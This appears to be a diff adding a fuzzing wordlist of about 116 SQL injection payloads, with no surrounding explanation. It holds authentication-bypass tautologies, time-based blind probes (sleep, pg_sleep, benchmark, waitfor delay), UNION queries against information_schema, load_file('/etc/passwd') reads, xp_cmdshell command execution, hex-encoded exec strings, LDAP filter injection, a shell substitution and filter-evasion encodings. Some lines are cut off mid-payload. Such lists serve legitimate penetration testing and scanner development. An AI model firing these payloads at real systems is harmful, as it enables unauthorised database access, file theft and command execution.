@@ -1,0 +1,116 @@
+benchmark(10000000,MD5(1))#
+";waitfor delay '0:0:__TIME__'--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+hi"""") or (""""a""""=""""a"""
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+*(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+1) or sleep(__TIME__)#
+) or ('a'='a
+; exec xp_regread
+1)) or benchmark(10000000,MD5(1))#
+a"""" or 3=3--"""
+" or benchmark(10000000,MD5(1))#
+ or 0=0 --
+1 waitfor delay '0:0:10'--
+ or 'a'='a
+hi or 1=1 --"
+ UNION ALL SELECT
+) or sleep(__TIME__)='
+)) or benchmark(10000000,MD5(1))#
+hi' or 'a'='a
+")) or benchmark(10000000,MD5(1))#
+hi') or ('a'='a
+ or 3=3
+));waitfor delay '0:0:__TIME__'--
+a' waitfor delay '0:0:10'--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+or%201=1
+1 or sleep(__TIME__)#
+or 1=1
+ and 1 in (select var from temp)--
+ or '7659'='7659
+ or 1=1 or ''='
+declare @s varchar (200) select @s = 0x73656c6 ...
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+ or pg_sleep(__TIME__)--"
+ or 'unusual' = 'unusual'
+1) or benchmark(10000000,MD5(1))#
+declare @s varchar(200) select @s = 0x77616974 ...
+"));waitfor delay '0:0:__TIME__'--
+or%201=1 --
+%2A%28%7C%28objectclass%3D%2A%29%29
+) union select * from information_schema.tables;
+PRINT @@variable
+or isNULL(1/0) /*
+ or ""a""=""a"
+ or 1=1--
+ and 1=( if((load_file(char(110,46,101,120,11 ...
+%20'sleep%2050'
+1)) or pg_sleep(__TIME__)--
+/**/or/**/1/**/=/**/1
+ union all select @@version--
+ or (EXISTS)
+t'exec master..xp_cmdshell 'nslookup www.googl ...
+%20$(sleep%2050)
+1 or benchmark(10000000,MD5(1))#
+%20or%20''='
+ or pg_sleep(__TIME__)--
+hi' or 'x'='x';
+) or sleep(__TIME__)=
+ or 'whatever' in ('whatever')
+; begin declare @var varchar(8000) set @var=' ...
+ union select 1,load_file('/etc/passwd'),1,1,1;
+exec(@s)
+) or pg_sleep(__TIME__)--
+ or sleep(__TIME__)#
+ select * from information_schema.tables--
+a' or 1=1--
+a' or 'a' = 'a
+declare @s varchar(22) select @s =
+ or 2 between 1 and 3
+ or '1'='1
+ or sleep(__TIME__)='
+or 0=0 #"
+" or isNULL(1/0) /*
+declare @s varchar (8000) select @s = 0x73656c ...
+â or 1=1 --
+char%4039%41%2b%40SELECT
+ having 1=1--
+) or benchmark(10000000,MD5(1))#
+ or username like char(37);
+;waitfor delay '0:0:__TIME__'--
+ or 1=1--"
+ or 'text' > 't'
+ or benchmark(10000000,MD5(1))#
+");waitfor delay '0:0:__TIME__'--
+a' or 3=3--
+ group by userid having 1=1--
+ or ''='
+; exec master..xp_cmdshell
+%20or%20x=x
+)) or sleep(__TIME__)="""
+hi' or 1=1 --
+") or pg_sleep(__TIME__)--
+%20or%20'x'='x
+ or 'something' = 'some'+'thing'
+Ã½ or 1=1 --
+1 or pg_sleep(__TIME__)--
+0 or 1=1
+uni/**/on sel/**/ect
+%27%20or%201=1
+)) or pg_sleep(__TIME__)--
+%7C
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+&apos;%20OR
+; or '1'='1'
+declare @q nvarchar (200) select @q = 0x770061 ...
+1 or 1=1
+; exec ('sel' + 'ect us' + 'er')
+23 OR 1=1
+anything' OR 'x'='x
+declare @q nvarchar (4000) select @q =
+or 0=0 --
+||'6
